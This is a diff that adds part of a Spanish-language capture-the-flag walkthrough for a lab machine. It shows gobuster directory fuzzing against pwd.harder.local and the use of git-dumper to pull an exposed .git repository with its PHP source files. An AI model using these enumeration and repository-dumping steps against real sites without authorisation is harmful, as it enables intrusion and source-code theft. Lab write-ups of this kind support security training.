@@ -95,6 +95,46 @@ domain=pwd.harder.local
 
     10.10.54.78     pwd.harder.local
 
+Accedermos a la web
+
+![image](https://github.com/Esevka/CTF/assets/139042999/1fc66d1c-a925-4138-bc7b-fc1e04fe13dc)
+
+![image](https://github.com/Esevka/CTF/assets/139042999/a912ced3-8d0a-4a43-ae25-a5b73d44c7c6)
+
+Despues de revisar el codigo de la web y probar varias credenciales por defecto no conseguimos nada, por lo que vamos a fuzzear el dominio en busca de directorios.
+
+    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
+    └─# gobuster dir -u http://pwd.harder.local/ -w /usr/share/wordlists/dirb/common.txt -o fuzz_dominio  
+ 
+    /.git/HEAD            (Status: 200) [Size: 23]
+    /index.php            (Status: 200) [Size: 19926]
+
+Como vemos el directorio /.git que antes no teniamos acceso, a traves del dominio nos entrega un http status 200 por lo que tenemos acceso a el y podemos realizar un dumpeo.
+
+
+Para dumpear el directorio /.git vamos a utlizar la herramienta git-dumper. Enlace --> https://github.com/arthaud/git-dumper
+
+    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
+    └─# git-dumper http://pwd.harder.local/.git/ dump_git                                            
+    [-] Testing http://pwd.harder.local/.git/HEAD [200]
+    [-] Testing http://pwd.harder.local/.git/ [403]
+    [-] Fetching common files
+    ...
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/dump_git]
+    └─# ls
+    auth.php  hmac.php  index.php
+
+
+
+
+
+
+
+
+
+
+
 
 
 
